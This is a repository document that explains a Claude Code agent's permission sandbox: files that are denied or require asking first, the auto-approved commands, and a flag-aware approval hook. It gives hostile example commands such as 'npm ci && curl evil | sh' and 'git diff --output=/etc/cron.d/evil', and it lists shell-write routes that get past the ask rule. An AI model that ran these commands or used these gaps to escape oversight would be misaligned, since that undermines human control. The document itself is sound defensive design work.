# Agent Sandbox & Off-Limits Config

This file explains the permission posture committed in `.claude/settings.json`:
what an autonomous agent (Claude Code) is auto-allowed to run, what it is
hard-blocked from touching, what it must stop and ask a human before editing, and
how a human changes any of it. Read this if a tool call was unexpectedly
**denied**, unexpectedly **prompted**, or unexpectedly **auto-approved**.

`.claude/hooks/__tests__/settings-permissions.test.sh` derives the governed files
from `settings.json` and fails unless each one has a table row below, under the
heading for its kind, and is named in CONTRIBUTING.md's pointer row for this file.

## One off-limits file (hard-blocked, not prompted)

The `permissions.deny` block blocks `Edit` and `Write` to exactly one path:

| File | Why it is off-limits |
|------|----------------------|
| `.claude/settings.json` | It defines the agent's OWN permissions, hooks, and deny rules. Letting an agent edit it would let the agent widen its own sandbox — rules cannot constrain the thing that governs them. |

`deny` is a HARD block: the agent gets a refusal, not a "do you want to allow
this?" prompt. The path is root-anchored (`/.claude/settings.json`) and denied for
BOTH `Edit` and `Write` — they are distinct tools, and a deny on one does not
imply the other.

### How this file actually changes

A human edits it by hand, in a normal editor or via Claude Code's interactive
`/permissions` UI — neither path goes through the `Edit`/`Write` tools the deny
rule gates. CI re-checks the posture on every change with
`settings-permissions.test.sh`, and the Codex guard in `ci.yml` independently
rejects a permissive Codex profile whether or not any rule exists.

### If an agent legitimately needs it changed

It cannot do it itself, by design. It should surface the exact change it wants and
why, and let a human make the edit (or temporarily lift the rule via
`/permissions`). Widening the sandbox is a human decision recorded in a reviewable
diff — not something the agent can do mid-task.

## One ask-first file (prompted in every mode, never auto-approved)

The `permissions.ask` block makes `Edit` and `Write` to exactly one path stop for a
human's yes:

| File | Why it is ask-first |
|------|---------------------|
| `.codex/config.toml` | It declares the MCP servers a Codex session LAUNCHES. Every `[mcp_servers.*]` table is a `command` + `args` run on the developer's machine with the credentials named in its `env_vars`, so an edit there is code execution the next time someone starts Codex. It is not hard-blocked because it is hand-maintained (its server tables mirror `.mcp.json`), and a hard block made that maintenance impossible for an agent even with a human watching. |

It sat in `deny` beside `settings.json` until #10134 lifted that block for
maintainability. Lifting it outright left nothing between an agent's
`Edit`/`Write` and the Codex launch path until CI ran, so it is `ask` instead.
What `ask` means, per Claude Code's permission docs
([permissions](https://code.claude.com/docs/en/permissions),
[permission modes](https://code.claude.com/docs/en/permission-modes)):

- Rules are evaluated deny, then ask, then allow — so no `allow` rule can
  pre-approve an edit to this file.
- An explicit ask rule is on the list of "actions no mode auto-approves": it
  prompts in manual, `acceptEdits`, `auto` **and** `bypassPermissions` mode. An
  unattended `-p` run denies the call instead of prompting.
- The person approving sees the proposed edit, so a changed `command`, `args` or
  `env` is in front of a human before it is on disk.

The path is root-anchored (`/.codex/config.toml`) and listed for BOTH `Edit` and
`Write`, for the same reason as the deny above.

What it does NOT cover, stated plainly:

- **Shell writes.** Claude Code checks a shell redirect target against `Edit`
  allow/deny rules and protected paths, not against ask rules, so
  `> .codex/config.toml`, `sed -i`, `cp` or an interpreter write is not prompted by
  this rule. (The old deny stopped a redirect, but not `sed -i`, `cp` or an
  interpreter either.)
- **Codex itself**, which never reads Claude Code's permission rules — the Codex
  app rewrites this file unprompted — and a human's own editor.

Behind every writer, at CI and at push time:

- **Its dangerous PROFILE** — `scripts/check-codex-config-safety.sh` in CI rejects
  a committed `approval_policy = "never"` together with `network_access = true`,
  whoever wrote it.
- **Drift from `.mcp.json`** — `tools/agentic-sync/port.mjs --check` requires the
  same server names, each with the exact `command` and `args` of its `.mcp.json`
  entry and every `${VAR}` secret forwarded by name in `env_vars`. It does not
  compare any other key in a server table, nor an `env` entry `.mcp.json` does not
  have; the prompt above and PR review are what see those.
- **Secret-shaped CONTENT** — GitHub secret-scanning push protection, enabled
  repo-wide, rejects a recognised credential at push time for every file and every
  actor. Verify with
  `gh api repos/Tristan578/project-forge --jq .security_and_analysis`. It matches
  KNOWN provider patterns, so an arbitrary internal credential with no
  recognisable shape is not caught by it.

## What IS auto-approved (two complementary layers)

Safe read/build/test commands are auto-approved so the agent does not stop to ask
for routine work. Two layers cooperate, and the split between them is deliberate:
a native `permissions.allow` prefix rule is **flag-blind** — `Bash(git diff:*)`
matches `git diff HEAD` and `git diff --output=/etc/cron.d/evil` (arbitrary file
write) and `git diff -x ./evil.sh` (runs an arbitrary program) alike. So a command
goes on the static fast-path **only if it is safe with ANY argument**; everything
whose danger lives in a *flag* is handled by the hook, which can inspect flags.

1. **Static `permissions.allow`** — Claude Code's native fast-path. Restricted to
   commands that cannot be weaponized by an argument: `npm ci`/`install`/`run`/
   `test` (build/test — they run the project's own trusted package scripts),
   `npm ls` (a pure read), and `git status`/`rev-parse` (pure reads).
   Prefix rules (`Bash(npm ci:*)`) match the command and its arguments. Notably
   ABSENT, and intentionally so: `git diff`/`log`/`show` and `cargo check` (their
   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs), the
   `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config`/`--reporter`/
   `--format`/`-f` load a file that is itself executable code), and `npm audit`
   (bare `npm audit` is a read, but a prefix rule is subcommand-blind and would
   auto-approve `npm audit fix`, which runs `npm install` lifecycle scripts and
   rewrites the lockfile). Those are safe in their everyday form but flag- or
   subcommand-sensitive, so they live in the flag-aware hook instead — never on the
   blunt fast-path. This keeps the static list safe regardless of how the hook
   behaves.

2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — the
   comprehensive flag-aware layer. It auto-approves the flag-sensitive build/read
   tools the static list omits (`git diff`/`log`/`show`, `cargo check`, `npx
   vitest`/`eslint`/`tsc`/`playwright`) **in their safe form**, plus commands the
   static list never enumerates (`npx @axe-core/cli`, `npx @axe-core/reporter`,
   `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`,
   `npm audit` and `npm audit --<flag>` — but NOT `npm audit fix`). It
   emits an `allow` decision for a known-safe SINGLE command, `ask` for everything
   else, and ALWAYS exits 0 — it never hard-blocks. Two gates fire BEFORE the
   allow-list is consulted:
   - **Operator gate** — refuses any compound, piped, redirected, substituted,
     variable-expanded, or multi-line command even when the leading token is safe
     (`npm ci && curl evil | sh` prefix-matches `npm ci`).
   - **Flag gate** — refuses any command carrying a program-execution, file-write,
     or module-loading flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
     `--exec`/`--upload-pack`/`--receive-pack`, and `--reporter` — vitest/playwright
     `import()` a reporter module). The gate is value-blind: it cannot tell a builtin
     `--reporter=verbose` from `--reporter=./pwn.js`, so even the harmless builtin
     form defers to a prompt — a deliberate, low-frequency cost. eslint's `--format`/`-f` load a formatter module
     the same way and are gated WITHIN `npx` only: `git log --format=...` is a benign
     pretty-print string and `npm install -f` means `--force`, so a global gate
     would wrongly defer those. These need no shell operator, so the operator gate
     never sees them — the flag itself is the payload.

   Its allow-list and exact allow/ask/defer contract are pinned by
   `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.

Deliberately NOT auto-approved by either layer (they defer to a prompt):
`git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
-d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
`package.json`; only `npm pkg get` is auto-approved), `npm audit fix` (runs
`npm install` lifecycle scripts and rewrites the lockfile; only the read forms
`npm audit` / `npm audit --<flag>` are auto-approved), `npm exec` (runs arbitrary
package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
`generate` writes migration files).

Anything covered by neither layer falls through to a normal permission prompt. The
default is always "ask the human" — never silently allow, never silently block.
